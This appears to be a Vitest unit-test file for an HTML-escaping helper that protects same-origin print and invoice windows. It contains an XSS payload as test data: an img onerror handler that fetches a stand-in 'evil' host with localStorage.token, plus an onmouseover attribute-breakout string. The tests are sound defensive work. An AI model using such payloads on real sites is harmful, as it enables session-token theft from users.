import { describe, it, expect } from 'vitest';
import { escapeHtml, html, rawHtml } from './htmlEscape';

// The print/invoice generators write into a window opened with
// window.open('', '_blank'), which inherits this app's origin. A payload that
// survives into that document runs with access to the Supabase session, so
// these tests are the guard on a real escalation path, not a formatting nicety.
describe('htmlEscape', () => {
  const PAYLOAD = '<img src=x onerror="fetch(\'//evil/\'+localStorage.token)">';

  it('neutralises a script payload in a client name', () => {
    const out = html`<div class="value">${PAYLOAD}</div>`;
    // What matters is that the payload can never START A TAG. The text
    // "onerror=" surviving as inert character data is fine — with '<' encoded
    // the parser sees words, not an element. So assert on the delimiters:
    // the only '<' and '>' left are the ones from the template itself.
    expect(out).toBe(
      '<div class="value">&lt;img src=x onerror=&quot;fetch(&#39;//evil/&#39;+localStorage.token)&quot;&gt;</div>'
    );
    const injected = out.slice('<div class="value">'.length, -'</div>'.length);
    expect(injected).not.toMatch(/[<>]/);
  });

  it('actually renders the payload as text, not as an element', () => {
    const host = document.createElement('div');
    host.innerHTML = html`<div class="value">${PAYLOAD}</div>`;
    expect(host.querySelector('img')).toBeNull();
    expect(host.querySelector('.value').textContent).toBe(PAYLOAD);
  });

  it('closes the attribute-breakout vector', () => {
    const out = html`<div title="${'" onmouseover="alert(1)'}">x</div>`;
    // The quote that would end the title attribute must be encoded.
    expect(out).toContain('&quot;');
    expect(out).not.toMatch(/title="" onmouseover=/);
  });

  it('escapes single quotes and ampersands too', () => {
    expect(escapeHtml(`Tom & Jerry's`)).toBe('Tom &amp; Jerry&#39;s');
  });

  it('renders null and undefined as empty, not as the literal words', () => {
    expect(html`<td>${null}</td>`).toBe('<td></td>');
    expect(html`<td>${undefined}</td>`).toBe('<td></td>');
  });

  it('lets genuinely pre-built markup through via rawHtml', () => {
    const rows = html`<tr><td>${'Acme & Co'}</td></tr>`;
    const out = html`<table>${rawHtml(rows)}</table>`;
    expect(out).toBe('<table><tr><td>Acme &amp; Co</td></tr></table>');
  });

  it('escapes array members but honours rawHtml inside an array', () => {
    expect(html`<p>${['<b>', rawHtml('<i>')]}</p>`).toBe('<p>&lt;b&gt;<i></p>');
  });

  it('does not double-escape an already-escaped fragment passed as raw', () => {
    const once = html`<td>${'a & b'}</td>`;
    expect(html`<tr>${rawHtml(once)}</tr>`).toBe('<tr><td>a &amp; b</td></tr>');
  });
});
